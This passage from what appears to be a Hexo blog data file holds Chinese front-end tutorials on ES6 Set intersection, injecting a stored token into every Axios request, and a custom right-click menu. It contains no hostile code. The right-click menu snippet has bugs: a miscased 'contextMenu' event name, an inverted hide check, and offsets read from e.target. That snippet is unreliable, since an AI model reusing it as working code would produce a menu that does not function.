格式</span></span><br><span class=\"line\"><span class=\"keyword\">const</span> setArr1 = <span class=\"keyword\">new</span> <span class=\"built_in\">Set</span>(arr1.map(<span class=\"function\"><span class=\"params\">item</span> =&gt;</span> item.id));</span><br><span class=\"line\"><span class=\"keyword\">const</span> setArr2 = <span class=\"keyword\">new</span> <span class=\"built_in\">Set</span>(arr2.map(<span class=\"function\"><span class=\"params\">item</span> =&gt;</span> item.id));</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 调用数组 filter 方法</span></span><br><span class=\"line\"><span class=\"comment\">// 调用 Set 数据结构的 has 方法</span></span><br><span class=\"line\"><span class=\"keyword\">const</span> filterArr = [...setArr1].filter(<span class=\"function\"><span class=\"params\">item</span> =&gt;</span> setArr2.has(item))</span><br></pre></td></tr></table></figure>\n<h3 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结\"></a>总结</h3><p><code>es6</code> 语法为我们提供了很多便利的 <code>api</code>，避免我们再去书写那些繁琐的代码。<br>关于 <code>Set</code> 数据结构的更多信息可以点击<a href=\"https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Set\" target=\"_blank\" rel=\"noopener\">这里</a>。</p>"},{"title":"Axios设置默认请求参数","date":"2016-10-28T02:15:40.000Z","_content":"\n在网站建设成行对接 `api` 接口的时候经常会遇到一个场景——用户的登录验证。\n大多数的做法都是服务端返回一个 `token` 给客户端，客户端存储在 `cookie` 或者 `Storage` 中。\n等下次发请求的时候再将 `token` 携带，传递给服务端。但是这么做会非常的繁琐，每次都要在请求中设置 `token`。\n<!-- more -->\n\n### 解决方案\n\n#### 方案一\n使用 `axios` 官方提供的 `Interceptors` 拦截器进行配置。\n假设 `token` 是储存在 `localeStorage` 中；\n```js\n// 请求拦截器\naxios.interceptors.request.use(function (config) {\n    const token = localStorage.getItem('token')\n     // 判断请求的类型\n     // 如果是post请求就把默认参数拼到data里面\n     // 如果是get请求就拼到params里面\n    if(config.method === 'post') {\n        let data = qs.parse(config.data)\n\n        config.data = qs.stringify({\n            token: token,\n            ...data\n        })\n    } else if(config.method === 'get') {\n        config.params = {\n            token: token,\n            ...config.params\n        }\n    }\n    return config;\n  }, function (error) {\n    return Promise.reject(error);\n  })\n```\n\n拦截器会拦截所有的 `请求` 或者 `响应`，我们可以在拦截到请求的时候将用户的请求参数中添加 `token`。\n这样就不需要每次都在请求中添加一次 `token` 的操作了。\n\n**扩展**\n响应拦截器可以拦截每一次服务端的响应信息，用户的 `登录超时` 完全可以在这个拦截器中处理。\n\n#### 方案二\n通过更改 `request config` 的默认配置实现。\n在上文的介绍中，我们可以看到 `request config` 中有一项 `transformRequest` 的配置。该方法会在每个请求发送给服务端之前执行，我们来看下如何使用。\n```js\naxios.defaults.transformRequest = [function (data, header) {\n    const token = localStorage.getItem('token')\n    //header.post = {\n      //  \"Content-Type\": \"application/json;charset=UTF-8\"\n    //}\n    var obj = Object.assign({}, data, { token: token })\n    return JSON.stringify(obj)\n}]\n```\n\n使用这个方法的时候有几个需要注意的地方:\n1. 该方法的返回值必须是 `string` 或 `Buffer实例` 或 `ArrayBuffer` 或 `FormData` 或 `Stream`。\n2. 转换完之后请求体的 `payload` 会变成 `FormData` 的形式，可以在 `header` 中重写 `Content-Type`。\n\n### 总结\n`Axios` 提供了非常灵活的配置方法供用户使用，我们不需要再自己封装一个类似的 `xhr` 方法。所有的用法官方都有详细的说明，如果你想了解更多，可以点击[这里](https://github.com/axios/axios)。","source":"_posts/axios设置默认参数.md","raw":"---\ntitle: Axios设置默认请求参数\ndate: 2016-10-28 10:15:40\ntags:\n---\n\n在网站建设成行对接 `api` 接口的时候经常会遇到一个场景——用户的登录验证。\n大多数的做法都是服务端返回一个 `token` 给客户端，客户端存储在 `cookie` 或者 `Storage` 中。\n等下次发请求的时候再将 `token` 携带，传递给服务端。但是这么做会非常的繁琐，每次都要在请求中设置 `token`。\n<!-- more -->\n\n### 解决方案\n\n#### 方案一\n使用 `axios` 官方提供的 `Interceptors` 拦截器进行配置。\n假设 `token` 是储存在 `localeStorage` 中；\n```js\n// 请求拦截器\naxios.interceptors.request.use(function (config) {\n    const token = localStorage.getItem('token')\n     // 判断请求的类型\n     // 如果是post请求就把默认参数拼到data里面\n     // 如果是get请求就拼到params里面\n    if(config.method === 'post') {\n        let data = qs.parse(config.data)\n\n        config.data = qs.stringify({\n            token: token,\n            ...data\n        })\n    } else if(config.method === 'get') {\n        config.params = {\n            token: token,\n            ...config.params\n        }\n    }\n    return config;\n  }, function (error) {\n    return Promise.reject(error);\n  })\n```\n\n拦截器会拦截所有的 `请求` 或者 `响应`，我们可以在拦截到请求的时候将用户的请求参数中添加 `token`。\n这样就不需要每次都在请求中添加一次 `token` 的操作了。\n\n**扩展**\n响应拦截器可以拦截每一次服务端的响应信息，用户的 `登录超时` 完全可以在这个拦截器中处理。\n\n#### 方案二\n通过更改 `request config` 的默认配置实现。\n在上文的介绍中，我们可以看到 `request config` 中有一项 `transformRequest` 的配置。该方法会在每个请求发送给服务端之前执行，我们来看下如何使用。\n```js\naxios.defaults.transformRequest = [function (data, header) {\n    const token = localStorage.getItem('token')\n    //header.post = {\n      //  \"Content-Type\": \"application/json;charset=UTF-8\"\n    //}\n    var obj = Object.assign({}, data, { token: token })\n    return JSON.stringify(obj)\n}]\n```\n\n使用这个方法的时候有几个需要注意的地方:\n1. 该方法的返回值必须是 `string` 或 `Buffer实例` 或 `ArrayBuffer` 或 `FormData` 或 `Stream`。\n2. 转换完之后请求体的 `payload` 会变成 `FormData` 的形式，可以在 `header` 中重写 `Content-Type`。\n\n### 总结\n`Axios` 提供了非常灵活的配置方法供用户使用，我们不需要再自己封装一个类似的 `xhr` 方法。所有的用法官方都有详细的说明，如果你想了解更多，可以点击[这里](https://github.com/axios/axios)。","slug":"axios设置默认参数","published":1,"updated":"2018-10-25T06:05:58.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjno6s7qu000g02vs8sm9gr83","content":"<p>在网站建设成行对接 <code>api</code> 接口的时候经常会遇到一个场景——用户的登录验证。<br>大多数的做法都是服务端返回一个 <code>token</code> 给客户端，客户端存储在 <code>cookie</code> 或者 <code>Storage</code> 中。<br>等下次发请求的时候再将 <code>token</code> 携带，传递给服务端。但是这么做会非常的繁琐，每次都要在请求中设置 <code>token</code>。<br><a id=\"more\"></a></p>\n<h3 id=\"解决方案\"><a href=\"#解决方案\" class=\"headerlink\" title=\"解决方案\"></a>解决方案</h3><h4 id=\"方案一\"><a href=\"#方案一\" class=\"headerlink\" title=\"方案一\"></a>方案一</h4><p>使用 <code>axios</code> 官方提供的 <code>Interceptors</code> 拦截器进行配置。<br>假设 <code>token</code> 是储存在 <code>localeStorage</code> 中；<br><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 请求拦截器</span></span><br><span class=\"line\">axios.interceptors.request.use(<span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\">config</span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">const</span> token = localStorage.getItem(<span class=\"string\">'token'</span>)</span><br><span class=\"line\">     <span class=\"comment\">// 判断请求的类型</span></span><br><span class=\"line\">     <span class=\"comment\">// 如果是post请求就把默认参数拼到data里面</span></span><br><span class=\"line\">     <span class=\"comment\">// 如果是get请求就拼到params里面</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span>(config.method === <span class=\"string\">'post'</span>) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">let</span> data = qs.parse(config.data)</span><br><span class=\"line\"></span><br><span class=\"line\">        config.data = qs.stringify(&#123;</span><br><span class=\"line\">            token: token,</span><br><span class=\"line\">            ...data</span><br><span class=\"line\">        &#125;)</span><br><span class=\"line\">    &#125; <span class=\"keyword\">else</span> <span class=\"keyword\">if</span>(config.method === <span class=\"string\">'get'</span>) &#123;</span><br><span class=\"line\">        config.params = &#123;</span><br><span class=\"line\">            token: token,</span><br><span class=\"line\">            ...config.params</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> config;</span><br><span class=\"line\">  &#125;, <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\">error</span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"built_in\">Promise</span>.reject(error);</span><br><span class=\"line\">  &#125;)</span><br></pre></td></tr></table></figure></p>\n<p>拦截器会拦截所有的 <code>请求</code> 或者 <code>响应</code>，我们可以在拦截到请求的时候将用户的请求参数中添加 <code>token</code>。<br>这样就不需要每次都在请求中添加一次 <code>token</code> 的操作了。</p>\n<p><strong>扩展</strong><br>响应拦截器可以拦截每一次服务端的响应信息，用户的 <code>登录超时</code> 完全可以在这个拦截器中处理。</p>\n<h4 id=\"方案二\"><a href=\"#方案二\" class=\"headerlink\" title=\"方案二\"></a>方案二</h4><p>通过更改 <code>request config</code> 的默认配置实现。<br>在上文的介绍中，我们可以看到 <code>request config</code> 中有一项 <code>transformRequest</code> 的配置。该方法会在每个请求发送给服务端之前执行，我们来看下如何使用。<br><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">axios.defaults.transformRequest = [<span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\">data, header</span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">const</span> token = localStorage.getItem(<span class=\"string\">'token'</span>)</span><br><span class=\"line\">    <span class=\"comment\">//header.post = &#123;</span></span><br><span class=\"line\">      <span class=\"comment\">//  \"Content-Type\": \"application/json;charset=UTF-8\"</span></span><br><span class=\"line\">    <span class=\"comment\">//&#125;</span></span><br><span class=\"line\">    <span class=\"keyword\">var</span> obj = <span class=\"built_in\">Object</span>.assign(&#123;&#125;, data, &#123; <span class=\"attr\">token</span>: token &#125;)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"built_in\">JSON</span>.stringify(obj)</span><br><span class=\"line\">&#125;]</span><br></pre></td></tr></table></figure></p>\n<p>使用这个方法的时候有几个需要注意的地方:</p>\n<ol>\n<li>该方法的返回值必须是 <code>string</code> 或 <code>Buffer实例</code> 或 <code>ArrayBuffer</code> 或 <code>FormData</code> 或 <code>Stream</code>。</li>\n<li>转换完之后请求体的 <code>payload</code> 会变成 <code>FormData</code> 的形式，可以在 <code>header</code> 中重写 <code>Content-Type</code>。</li>\n</ol>\n<h3 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结\"></a>总结</h3><p><code>Axios</code> 提供了非常灵活的配置方法供用户使用，我们不需要再自己封装一个类似的 <code>xhr</code> 方法。所有的用法官方都有详细的说明，如果你想了解更多，可以点击<a href=\"https://github.com/axios/axios\">这里</a>。</p>\n","site":{"data":{}},"excerpt":"<p>在网站建设成行对接 <code>api</code> 接口的时候经常会遇到一个场景——用户的登录验证。<br>大多数的做法都是服务端返回一个 <code>token</code> 给客户端，客户端存储在 <code>cookie</code> 或者 <code>Storage</code> 中。<br>等下次发请求的时候再将 <code>token</code> 携带，传递给服务端。但是这么做会非常的繁琐，每次都要在请求中设置 <code>token</code>。<br>","more":"</p>\n<h3 id=\"解决方案\"><a href=\"#解决方案\" class=\"headerlink\" title=\"解决方案\"></a>解决方案</h3><h4 id=\"方案一\"><a href=\"#方案一\" class=\"headerlink\" title=\"方案一\"></a>方案一</h4><p>使用 <code>axios</code> 官方提供的 <code>Interceptors</code> 拦截器进行配置。<br>假设 <code>token</code> 是储存在 <code>localeStorage</code> 中；<br><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 请求拦截器</span></span><br><span class=\"line\">axios.interceptors.request.use(<span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\">config</span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">const</span> token = localStorage.getItem(<span class=\"string\">'token'</span>)</span><br><span class=\"line\">     <span class=\"comment\">// 判断请求的类型</span></span><br><span class=\"line\">     <span class=\"comment\">// 如果是post请求就把默认参数拼到data里面</span></span><br><span class=\"line\">     <span class=\"comment\">// 如果是get请求就拼到params里面</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span>(config.method === <span class=\"string\">'post'</span>) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">let</span> data = qs.parse(config.data)</span><br><span class=\"line\"></span><br><span class=\"line\">        config.data = qs.stringify(&#123;</span><br><span class=\"line\">            token: token,</span><br><span class=\"line\">            ...data</span><br><span class=\"line\">        &#125;)</span><br><span class=\"line\">    &#125; <span class=\"keyword\">else</span> <span class=\"keyword\">if</span>(config.method === <span class=\"string\">'get'</span>) &#123;</span><br><span class=\"line\">        config.params = &#123;</span><br><span class=\"line\">            token: token,</span><br><span class=\"line\">            ...config.params</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> config;</span><br><span class=\"line\">  &#125;, <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\">error</span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"built_in\">Promise</span>.reject(error);</span><br><span class=\"line\">  &#125;)</span><br></pre></td></tr></table></figure></p>\n<p>拦截器会拦截所有的 <code>请求</code> 或者 <code>响应</code>，我们可以在拦截到请求的时候将用户的请求参数中添加 <code>token</code>。<br>这样就不需要每次都在请求中添加一次 <code>token</code> 的操作了。</p>\n<p><strong>扩展</strong><br>响应拦截器可以拦截每一次服务端的响应信息，用户的 <code>登录超时</code> 完全可以在这个拦截器中处理。</p>\n<h4 id=\"方案二\"><a href=\"#方案二\" class=\"headerlink\" title=\"方案二\"></a>方案二</h4><p>通过更改 <code>request config</code> 的默认配置实现。<br>在上文的介绍中，我们可以看到 <code>request config</code> 中有一项 <code>transformRequest</code> 的配置。该方法会在每个请求发送给服务端之前执行，我们来看下如何使用。<br><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">axios.defaults.transformRequest = [<span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\">data, header</span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">const</span> token = localStorage.getItem(<span class=\"string\">'token'</span>)</span><br><span class=\"line\">    <span class=\"comment\">//header.post = &#123;</span></span><br><span class=\"line\">      <span class=\"comment\">//  \"Content-Type\": \"application/json;charset=UTF-8\"</span></span><br><span class=\"line\">    <span class=\"comment\">//&#125;</span></span><br><span class=\"line\">    <span class=\"keyword\">var</span> obj = <span class=\"built_in\">Object</span>.assign(&#123;&#125;, data, &#123; <span class=\"attr\">token</span>: token &#125;)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"built_in\">JSON</span>.stringify(obj)</span><br><span class=\"line\">&#125;]</span><br></pre></td></tr></table></figure></p>\n<p>使用这个方法的时候有几个需要注意的地方:</p>\n<ol>\n<li>该方法的返回值必须是 <code>string</code> 或 <code>Buffer实例</code> 或 <code>ArrayBuffer</code> 或 <code>FormData</code> 或 <code>Stream</code>。</li>\n<li>转换完之后请求体的 <code>payload</code> 会变成 <code>FormData</code> 的形式，可以在 <code>header</code> 中重写 <code>Content-Type</code>。</li>\n</ol>\n<h3 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结\"></a>总结</h3><p><code>Axios</code> 提供了非常灵活的配置方法供用户使用，我们不需要再自己封装一个类似的 <code>xhr</code> 方法。所有的用法官方都有详细的说明，如果你想了解更多，可以点击<a href=\"https://github.com/axios/axios\">这里</a>。</p>"},{"title":"右键菜单","date":"2017-06-11T06:17:09.000Z","_content":"\n这几天写了一个**自定义右键菜单**的功能，在这里记录下吧。\n<!-- more -->\n\n### 前言\n\n自定义右键菜单也算是一个很常见的功能了，一般大多数的网盘空间都会使用自定义右键菜单。\n\n\n#### 实现右键菜单\n\n这里假设我们有这样的一个 `HTML` 结构。`container` 是外部容器， `right-menu` 则是我们需要展示的右键菜单。\n\n\n```html\n<style>\n    .container {\n        width: 800px;\n        height: 300px;\n        position: relative;\n    }\n\n    .hide {\n        display: none !important;\n    }\n\n    .right-menu {\n        width: 80px;\n        height: 120px;\n        position: absolute;\n        top: 0;\n        left: 0;\n    }\n</style>\n\n\n<div class='container'>\n    <!-- 内容区域 -->\n    <div class='content'>\n\n        <div class='content-item'></div>\n        <div class='content-item'></div>\n        <div class='content-item'></div>\n        <!-- ... -->\n\n    </div>\n\n\n    <div class='right-menu hide'>\n        <!-- 右键菜单内容区域 -->\n    </div>\n</div>\n```\n\n1. 想要使用自己的右键菜单我们必须先禁用浏览器自带的右键菜单，然后在当前鼠标位置展示我们自己的菜单。\n\n```js\n// 右键菜单事件\nlet container = document.querySelector('.container');\n    menu = document.querySelector('.container .right-menu');\n\ncontainer.addEventListener('contextMenu', (e) => {\n    // 禁用浏览器事件\n    e.preventDefault();\n\n    menu.classList.remove('hide');\n    menu.style.left = e.target.offsetX + 'px';\n    menu.style.top = e.target.offsetY + 'px';\n\n})\n\n// 隐藏菜单\ndocument.addEventListener('click', () => {\n\n    if(!menu.classList.contains('hide')) return;\n    menu.classList.add('hide');\n})\n```\n\n卧槽，没想到这次这么快就...\n\n#### 补充点内容\n\n上面写的只是最简单的一种情况——右键菜单在容器上触发。实际情况下，触发的元素不是在容器上，而是在容器的内容上。\n也就是结构中的 `content-item` 上。这个时候右键菜单的位置就不能根据 `e.target.offsetX` 和 `e.target.offsetY` 来确定了。\n\n```js\n// ...\n    \n    menu.style.left = e.target.offsetX + parseInt(e.target.parentNode.offsetLeft) +'px';\n    menu.style.top = e.target.offsetY + parseInt(e.target.parentNode.offsetTop) + 'px';\n\n//...\n```\n\n到这里是真的没什么要补充的了，我还是想想下次写什么能写长一点把。\n\n\n\n\n\n\n","source":"_posts/右键菜单.md","raw":"---\ntitle: 右键菜单\ndate: 2017-06-11 14:17:09\ntags:\n---\n\n这几天写了一个**自定义右键菜单**的功能，在这里记录下吧。\n<!-- more -->\n\n### 前言\n\n自定义右键菜单也算是一个很常见的功能了，一般大多数的网盘空间都会使用自定义右键菜单。\n\n\n#### 实现右键菜单\n\n这里假设我们有这样的一个 `HTML` 结构。`container` 是外部容器， `right-menu` 则是我们需要展示的右键菜单。\n\n\n```html\n<style>\n    .container {\n        width: 800px;\n        height: 300px;\n        position: relative;\n    }\n\n    .hide {\n        display: none !important;\n    }\n\n    .right-menu {\n        width: 80px;\n        height: 120px;\n        position: absolute;\n        top: 0;\n        left: 0;\n    }\n</style>\n\n\n<div class='container'>\n    <!-- 内容区域 -->\n    <div class='content'>\n\n        <div class='content-item'></div>\n        <div class='content-item'></div>\n        <div class='content-item'></div>\n        <!-- ... -->\n\n    </div>\n\n\n    <div class='right-menu hide'>\n        <!-- 右键菜单内容区域 -->\n    </div>\n</div>\n```\n\n1. 想要使用自己的右键菜单我们必须先禁用浏览器自带的右键菜单，然后在当前鼠标位置展示我们自己的菜单。\n\n```js\n// 右键菜单事件\nlet container = document.querySelector('.container');\n    menu = document.querySelector('.container .right-menu');\n\ncontainer.addEventListener('contextMenu', (e) => {\n    // 禁用浏览器事件\n    e.preventDefault();\n\n    menu.classList.remove('hide');\n    menu.style.left = e.target.offsetX + 'px';\n    menu.style.top = e.target.offsetY + 'px';\n\n})\n\n// 隐藏菜单\ndocument.addEventListener('click', () => {\n\n    if(!menu.classList.contains('hide')) return;\n    menu.classList.add('hide');\n})\n```\n\n卧槽，没想到这次这么快就...\n\n#### 补充点内容\n\n上面写的只是最简单的一种情况——右键菜单在容器上触发。实际情况下，触发的元素不是在容器上，而是在容器的内容上。\n也就是结构中的 `content-item` 上。这个时候右键菜单的位置就不能根据 `e.target.offsetX` 和 `e.target.offsetY` 来确定了。\n\n```js\n// ...\n    \n    menu.style.left = e.target.offsetX + parseInt(e.target.parentNode.offsetLeft) +'px';\n    menu.style.top = e.target.offsetY + parseInt(e.target.parentNode.offsetTop) + 'px';\n\n//...\n```\n\n到这里是真的没什么要补充的了，我还是想想下次写什么能写长一点把。\n\n\n\n\n\n\n","slug":"右键菜单","published":1,"updated":"2018-10-25T06:05:58.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjno6s7qv000h02vsak6pcqh6","content":"<p>这几天写了一个<strong>自定义右键菜单</strong>的功能，在这里记录下吧。<br><a id=\"more\"></a></p>\n<h3 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h3><p>自定义右键菜单也算是一个很常见的功能了，一般大多数的网盘空间都会使用自定义右键菜单。</p>\n<h4 id=\"实现右键菜单\"><a href=\"#实现右键菜单\" class=\"headerlink\" title=\"实现右键菜单\"></a>实现右键菜单</h4><p>这里假设我们有这样的一个 <code>HTML</code> 结构。<code>container</code> 是外部容器， <code>right-menu</code> 则是我们需要展示的右键菜单。</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">style</span>&gt;</span><span class=\"undefined\"></span></span><br><span class=\"line\"><span class=\"undefined\">    .container &#123;</span></span><br><span class=\"line\"><span class=\"undefined\">        width: 800px;</span></span><br><span class=\"line\"><span class=\"undefined\">        height: 300px;</span></span><br><span class=\"line\"><span class=\"undefined\">        position: relative;</span></span><br><span class=\"line\"><span class=\"undefined\">    &#125;</span></span><br><span class=\"line\"><span class=\"undefined\"></span></span><br><span class=\"line\"><span class=\"undefined\">    .hide &#123;</span></span><br><span class=\"line\"><span class=\"undefined\">        display: none !important;</span></span><br><span class=\"line\"><span class=\"undefined\">    &#125;</span></span><br><span class=\"line\"><span class=\"undefined\"></span></span><br><span class=\"line\"><span class=\"undefined\">    .right-menu &#123;</span></span><br><span class=\"line\"><span class=\"undefined\">        width: 80px;</span></span><br><span class=\"line\"><span class=\"undefined\">        height: 120px;</span></span><br><span class=\"line\"><span class=\"undefined\">        position: absolute;</span></span><br><span class=\"line\"><span class=\"undefined\">        top: 0;</span></span><br><span class=\"line\"><span class=\"undefined\">        left: 0;</span></span><br><span class=\"line\"><span class=\"undefined\">    &#125;</span></span><br><span class=\"line\"><span class=\"undefined\"></span><span class=\"tag\">&lt;/<span class=\"name\">style</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">class</span>=<span class=\"string\">'container'</span>&gt;</span></span><br><span class=\"line\">    <span class=\"comment\">&lt;!-- 内容区域 --&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">class</span>=<span class=\"string\">'content'</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">class</span>=<span class=\"string\">'content-item'</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">class</span>=<span class=\"string\">'content-item'</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">class</span>=<span class=\"string\">'content-item'</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\">        <span class=\"comment\">&lt;!-- ... --&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">class</span>=<span class=\"string\">'right-menu hide'</span>&gt;</span></span><br><span class=\"line\">        <span class=\"comment\">&lt;!-- 右键菜单内容区域 --&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<ol>\n<li>想要使用自己的右键菜单我们必须先禁用浏览器自带的右键菜单，然后在当前鼠标位置展示我们自己的菜单。</li>\n</ol>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 右键菜单事件</span></span><br><span class=\"line\"><span class=\"keyword\">let</span> container = <span class=\"built_in\">document</span>.querySelector(<span class=\"string\">'.container'</span>);</span><br><span class=\"line\">    menu = <span class=\"built_in\">document</span>.querySelector(<span class=\"string\">'.container .right-menu'</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">container.addEventListener(<span class=\"string\">'contextMenu'</span>, (e) =&gt; &#123;</span><br><span class=\"line\">    <span class=\"comment\">// 禁用浏览器事件</span></span><br><span class=\"line\">    e.preventDefault();</span><br><span class=\"line\"></span><br><span class=\"line\">    menu.classList.remove(<span class=\"string\">'hide'</span>);</span><br><span class=\"line\">    menu.style.left = e.target.offsetX + <span class=\"string\">'px'</span>;</span><br><span class=\"line\">    menu.style.top = e.target.offsetY + <span class=\"string\">'px'</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 隐藏菜单</span></span><br><span class=\"line\"><span class=\"built_in\">document</span>.addEventListener(<span class=\"string\">'click'</span>, () =&gt; &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span>(!menu.classList.contains(<span class=\"string\">'hide'</span>)) <span class=\"keyword\">return</span>;</span><br><span class=\"line\">    menu.classList.add(<span class=\"string\">'hide'</span>);</span><br><span class=\"line\">&#125;)</span><br></pre></td></tr></table></figure>\n<p>卧槽，没想到这次这么快就…</p>\n<h4 id=\"补充点内容\"><a href=\"#补充点内容\" class=\"headerlink\" title=\"补充点内容\"></a>补充点内容</h4><p>上面写的只是最简单的一种情况——右键菜单在容器上触发。实际情况下，触发的元素不是在容器上，而是在容器的内容上。<br>也就是结构中的 <code>content-item</code> 上。这个时候右键菜单的位置就不能根据 <code>e.target.offsetX</code> 和 <code>e.target.offsetY</code> 来确定了。</p>\n<figure class=\"highlight js\"><table><tr><td 